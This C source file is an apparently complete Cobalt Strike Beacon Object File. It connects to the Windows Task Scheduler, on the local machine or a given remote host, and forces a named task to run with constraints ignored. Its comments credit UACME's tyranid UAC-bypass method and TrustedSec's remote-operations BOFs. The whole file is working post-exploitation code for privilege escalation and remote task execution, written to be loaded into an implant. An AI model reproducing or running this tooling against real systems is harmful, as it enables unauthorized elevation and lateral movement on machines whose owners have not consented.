#define _WIN32_DCOM
#include <windows.h>
#include <taskschd.h>
#include <sddl.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

// Implemented by 0xbad53c based on the following 2 resources:
// https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/tyranid.c
// https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/src/Remote/schtasksstop/entry.c
// All credits go to the authors of tyranid.c (James Forshaw) and entry.c (TrustedSec)

#ifndef TASK_RUN_FLAGS
typedef enum _TASK_RUN_FLAGS
{
    TASK_RUN_NO_FLAGS   = 0,
    TASK_RUN_AS_SELF    = 0x1,
    TASK_RUN_IGNORE_CONSTRAINTS = 0x2,
    TASK_RUN_USE_SESSION_ID = 0x4,
    TASK_RUN_USER_SID   = 0x8
}   TASK_RUN_FLAGS;
#endif 

DWORD runTask(const wchar_t * server, const wchar_t * taskname)
{
    HRESULT hr = S_OK;
    LONG flags = TASK_RUN_IGNORE_CONSTRAINTS;
    VARIANT Vserver;
    VARIANT VNull;
    ITaskFolder *pRootFolder = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    IRunningTask* pRunningTask = NULL;
    BSTR rootpath = NULL;
    BSTR taskpath = NULL;
    IID CTaskScheduler = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x45,0x72,0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
    ITaskService *pService = NULL;
    // Initialize variants
    OLEAUT32$VariantInit(&Vserver);
    OLEAUT32$VariantInit(&VNull);
    
    // Initialize COM
    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if(FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        internal_printf("Could not initialize com (%lX)\n", hr);
        goto runTask_end;
    }



    // Get an instance of the task scheduler
    hr = OLE32$CoCreateInstance( &CTaskScheduler,
                           NULL,
                           CLSCTX_INPROC_SERVER,
                           &IIDTaskService,
                           (void**)&pService ); 
    if(FAILED(hr))
    {
        internal_printf("Failed to create Task Scheduler interface (%lX)\n", hr);
        goto runTask_end;
    }

    // Set up our variant for the server name if we need to
    Vserver.vt = VT_BSTR;
    Vserver.bstrVal = OLEAUT32$SysAllocString(server);
    if(NULL == Vserver.bstrVal)
    {
        hr = ERROR_OUTOFMEMORY;
        internal_printf("SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }

    // Connect to the server
    // HRESULT Connect( VARIANT serverName, VARIANT user, VARIANT domain, VARIANT password );
    //internal_printf("Connecting to \"%S\"\n", Vserver.bstrVal);
    hr = pService->lpVtbl->Connect(pService, Vserver, VNull, VNull, VNull);
    if(FAILED(hr))
    {
        internal_printf("Failed to connect to requested target (%lX)\n", hr);
        goto runTask_end;
    }

    // Now we need to get the root folder 
    rootpath = OLEAUT32$SysAllocString(L"\\");
    if(NULL == rootpath)
    {
        hr = ERROR_OUTOFMEMORY;
        internal_printf("SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }
    hr = pService->lpVtbl->GetFolder(pService, rootpath, &pRootFolder);
    if(FAILED(hr))
    {
        internal_printf("Failed to get the root folder (%lX)\n", hr);
        goto runTask_end;
    }

    // Get the task name or current folder name
    taskpath = OLEAUT32$SysAllocString(taskname);
    if(NULL == taskpath)
    {
        hr = ERROR_OUTOFMEMORY;
        internal_printf("SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }

    // Get a reference to the target task
    hr = pRootFolder->lpVtbl->GetTask(pRootFolder, taskpath, &pRegisteredTask);
    if(FAILED(hr))
    {
        internal_printf("Failed to find the task: %S (%lX)\n", taskpath, hr);
        internal_printf("You must specify the full path and name of the task\n");
        goto runTask_end;
    }

    // Actually run the task
    hr = pRegisteredTask->lpVtbl->RunEx(pRegisteredTask, VNull, 2, 0, NULL, &pRunningTask);
    if(FAILED(hr))
    {
        internal_printf("Failed to run the task: %S (%lX)\n", taskpath, hr);
        goto runTask_end;
    }
        
    internal_printf("Run task returned success.\n");


runTask_end:
    if(taskpath)
    {
        OLEAUT32$SysFreeString(taskpath);
        taskpath = NULL;
    }

    if(rootpath)
    {
        OLEAUT32$SysFreeString(rootpath);
        rootpath = NULL;
    }

    if(pRegisteredTask)
    {
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
        pRegisteredTask = NULL;
    }

    if(pRootFolder)
    {
        pRootFolder->lpVtbl->Release(pRootFolder);
        pRootFolder = NULL;
    }

    if(pService)
    {
        pService->lpVtbl->Release(pService);
        pService = NULL;
    }

    OLEAUT32$VariantClear(&Vserver);

    OLE32$CoUninitialize();

    return (DWORD)hr;
}


#ifdef BOF
VOID go( 
    IN PCHAR Buffer, 
    IN ULONG Length 
) 
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    datap parser;
    const wchar_t * hostname;
    const wchar_t * taskname;

    BeaconDataParse(&parser, Buffer, Length);
    hostname = (const wchar_t *)BeaconDataExtract(&parser, NULL);
    taskname = (const wchar_t *)BeaconDataExtract(&parser, NULL);

    if(!bofstart())
    {
        return;
    }

    internal_printf("runTask hostname:%S taskname:%S\n", 
        hostname, taskname );

    dwErrorCode = runTask(hostname, taskname);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "runTask failed: %lX\n", dwErrorCode);
        goto go_end;
    }

    internal_printf("SUCCESS.\n");

go_end:
    printoutput(TRUE);
    
    bofstop();
};
#else
#define TEST_HOSTNAME    L""
#define TEST_TASK_NAME   L"\\BOF_FOLDER\\BOF_TASK"
int main(int argc, char ** argv)
{
    DWORD   dwErrorCode    = ERROR_SUCCESS;
    LPCWSTR lpcswzHostName = TEST_HOSTNAME;
    LPCWSTR lpcswzTaskName = TEST_TASK_NAME;
    
    internal_printf("runTask lpcswzHostName:%S lpcswzTaskName:%S\n", 
        lpcswzHostName, lpcswzTaskName );

    dwErrorCode = runTask(lpcswzHostName, lpcswzTaskName);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "runTask failed: %lX\n", dwErrorCode);
        goto main_end;
    }

    internal_printf("SUCCESS.\n");

main_end:
    return dwErrorCode;
}
#endif
